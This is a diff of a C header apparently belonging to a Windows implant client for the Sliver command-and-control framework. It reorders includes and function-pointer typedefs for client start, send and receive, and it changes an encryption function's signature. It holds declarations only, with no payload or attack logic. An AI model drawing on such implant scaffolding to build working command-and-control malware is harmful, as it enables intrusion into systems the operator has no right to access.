@@ -1,15 +1,5 @@
 #pragma once
 
-#include "Handler.h"
-#include "Beacon.h"
-#include "Http.h"
-#include "Drive.h"
-#include "Proxy.h"
-#include "Uri.h"
-#include "Session.h"
-#include "Socket.h"
-#include "Pivot.h"
-
 typedef struct _ENVELOPE ENVELOPE, *PENVELOPE;
 typedef struct _SESSION_WORK_WRAPPER SESSION_WORK_WRAPPER, * PSESSION_WORK_WRAPPER;
 typedef struct _URI URI, * PURI;
@@ -20,6 +10,23 @@ typedef struct _SLIVER_HTTP_CLIENT SLIVER_HTTP_CLIENT, * PSLIVER_HTTP_CLIENT;
 typedef struct _SLIVER_BEACON_CLIENT SLIVER_BEACON_CLIENT, * PSLIVER_BEACON_CLIENT;
 typedef struct _SLIVER_SESSION_CLIENT SLIVER_SESSION_CLIENT, * PSLIVER_SESSION_CLIENT;
 typedef struct _GLOBAL_CONFIG GLOBAL_CONFIG, * PGLOBAL_CONFIG;
+
+typedef LPVOID(WINAPI* CLIENT_INIT)();
+typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
+typedef BOOL(WINAPI* SEND_EVELOPE)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
+typedef PENVELOPE(WINAPI* RECV_EVELOPE)(PGLOBAL_CONFIG, LPVOID);
+typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
+typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
+
+#include "Handler.h"
+#include "Beacon.h"
+#include "Http.h"
+#include "Drive.h"
+#include "Proxy.h"
+#include "Uri.h"
+#include "Session.h"
+#include "Pivot.h"
+#include "Socket.h"
 
 struct _GLOBAL_CONFIG {
 	CHAR szSessionID[33];
@@ -62,13 +69,6 @@ typedef struct _SIGNATURE {
 	LPSTR lpTrustedComment;
 	BYTE GlobalSignature[64];
 } SIGNATURE, *PSIGNATURE;
-
-typedef LPVOID(WINAPI* CLIENT_INIT)();
-typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
-typedef BOOL(WINAPI* SEND_EVELOPE)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
-typedef PENVELOPE(WINAPI* RECV_EVELOPE)(PGLOBAL_CONFIG, LPVOID);
-typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
-typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
 
 PBUFFER RegisterSliver
 (
@@ -118,9 +118,8 @@ PBUFFER SliverDecrypt
 
 PBUFFER SliverEncrypt
 (
-	_In_ PGLOBAL_CONFIG pConfig,
-	_In_ PBUFFER pInput,
-	_In_ BOOL SendToServer
+	_In_ PBYTE pSessionKey,
+	_In_ PBUFFER pInput
 );
 
 VOID FreeGlobalConfig
